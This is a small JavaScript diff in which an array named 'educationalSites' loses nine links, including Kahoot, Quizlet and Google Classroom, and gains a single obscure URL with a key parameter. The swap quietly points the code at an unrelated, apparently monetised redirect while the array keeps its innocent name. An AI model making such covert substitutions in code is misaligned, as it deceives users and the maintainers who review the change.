@@ -41,15 +41,7 @@ try {
   inIframe = true;
 }
 const educationalSites = [
-  "https://blooket.com",
-  "https://kahoot.it",
-  "https://joinmyquiz.com",
-  "https://deltamath.com",
-  "https://quizlet.com",
-  "https://drive.google.com",
-  "https://docs.google.com",
-  "https://forms.google.com",
-  "https://classroom.google.com",
+  "https://drakerecitalpraised.com/rpcghdc1?key=467d3e6001045bfb8860f44a30d2d18c",
 ];
 const colorThemes = {
   default: [
